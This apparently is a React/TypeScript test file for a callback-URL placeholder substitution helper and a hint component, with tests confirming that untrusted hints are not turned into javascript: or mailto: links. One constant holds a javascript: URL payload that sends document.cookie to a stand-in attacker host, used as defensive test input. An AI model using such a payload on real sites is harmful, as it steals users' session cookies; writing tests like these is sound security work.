// SPDX-License-Identifier: Apache-2.0

/**
 * The `{{callback_url}}` substitution contract, plus the publisher-controlled
 * URL boundary the hint shares with the setup-guide steps.
 */

import { describe, it, expect } from "bun:test";
import { renderToStaticMarkup } from "react-dom/server";
import { I18nextProvider } from "react-i18next";
import i18n, { i18nReady } from "../../../i18n.ts";
import { CallbackUrlHint } from "../callback-url-hint.tsx";
import { substituteCallbackUrl } from "../../../lib/callback-url-hint.ts";

await i18nReady;
await i18n.changeLanguage("fr");

const CALLBACK = "http://localhost:3000/api/integrations/callback";
const XSS = "javascript:fetch('https://attacker.example/'+document.cookie)";

function render(hint: string, callbackUrl = CALLBACK): string {
  return renderToStaticMarkup(
    <I18nextProvider i18n={i18n}>
      <CallbackUrlHint hint={hint} callbackUrl={callbackUrl} authKey="primary" />
    </I18nextProvider>,
  );
}

describe("substituteCallbackUrl", () => {
  it("replaces the placeholder inside prose", () => {
    expect(substituteCallbackUrl("Set the redirect URI to: {{callback_url}}", CALLBACK)).toBe(
      `Set the redirect URI to: ${CALLBACK}`,
    );
  });

  it("replaces the placeholder inside a deep link", () => {
    expect(
      substituteCallbackUrl(
        "https://example.com/oauth/new?redirect_uri={{callback_url}}",
        CALLBACK,
      ),
    ).toBe(`https://example.com/oauth/new?redirect_uri=${CALLBACK}`);
  });

  it("replaces every occurrence, not just the first", () => {
    expect(substituteCallbackUrl("{{callback_url}} and again {{callback_url}}", CALLBACK)).toBe(
      `${CALLBACK} and again ${CALLBACK}`,
    );
  });

  it("leaves a hint without the placeholder untouched", () => {
    expect(substituteCallbackUrl("Register any HTTPS callback", CALLBACK)).toBe(
      "Register any HTTPS callback",
    );
  });

  // The whole point: before this existed the UI printed the placeholder
  // verbatim, so the admin copied `{{callback_url}}` into the provider's
  // console and the connect attempt failed with an opaque redirect mismatch.
  it("never leaks the raw placeholder", () => {
    expect(substituteCallbackUrl("go to {{callback_url}} now", CALLBACK)).not.toContain(
      "{{callback_url}}",
    );
  });

  it("tracks the callback it is given rather than a fixed host", () => {
    expect(substituteCallbackUrl("{{callback_url}}", "https://app.example.com/cb")).toBe(
      "https://app.example.com/cb",
    );
  });
});

describe("CallbackUrlHint rendering", () => {
  it("renders the substituted value, never the placeholder", () => {
    const html = render("Set the redirect URI to: {{callback_url}}");
    expect(html).not.toContain("callback_url}}");
    expect(html).toContain(CALLBACK);
  });

  it("linkifies a hint that resolves to a whole http(s) URL", () => {
    const html = render("https://example.com/oauth/new?redirect_uri={{callback_url}}");
    expect(html).toContain('<a href="https://example.com/oauth/new?redirect_uri=');
    expect(html).toContain('rel="noopener noreferrer"');
    expect(html).toContain('target="_blank"');
  });

  it("keeps prose as text — a partial URL must not become a link", () => {
    const html = render("Set the redirect URI to: {{callback_url}}");
    expect(html).not.toContain("<a href");
  });

  // `callback_url_hint` is publisher-controlled: a third-party manifest must
  // never be able to turn it into a navigation sink.
  it("refuses to linkify a javascript: hint", () => {
    const html = render(XSS);
    // Degrades to text, exactly like an unsafe setup-guide step: the
    // instruction stays readable, but there is no href to click. React escapes
    // the payload, so the quotes come back as entities rather than markup.
    expect(html).not.toContain("<a href");
    expect(html).not.toContain('href="javascript:');
    expect(html).toContain("&#x27;");
  });

  it("refuses to linkify a mailto: hint", () => {
    const html = render("mailto:support@example.com");
    expect(html).not.toContain("<a href");
  });
});
